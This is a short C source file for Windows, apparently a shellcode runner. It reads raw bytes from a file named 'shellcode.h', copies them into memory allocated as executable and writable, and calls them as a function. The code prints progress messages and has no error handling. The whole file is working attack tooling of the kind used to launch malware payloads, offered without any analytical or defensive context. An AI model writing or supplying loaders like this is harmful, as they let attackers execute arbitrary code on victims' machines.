#include <windows.h>
#include <tchar.h>

int main()
{
    DWORD bytesRead;
    BOOL fileReadSuccess, filePermChangeSuccess, processCreateSuccess;
    const TCHAR* filePath = _T("shellcode.h");

    printf("Loader started!\n");
    printf("Shellcode path: %s\n", filePath);

    HANDLE hFile = CreateFile(filePath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    DWORD fileSize = GetFileSize(hFile, NULL);
    LPVOID fileContent = malloc(fileSize);
    fileReadSuccess = ReadFile(hFile, fileContent, fileSize, &bytesRead, NULL);

    printf("Shellcode size: %d\n", fileSize);

    void *exec = VirtualAlloc(0, fileSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, fileContent, fileSize);
    ((void(*)())exec)();

    return 0;
}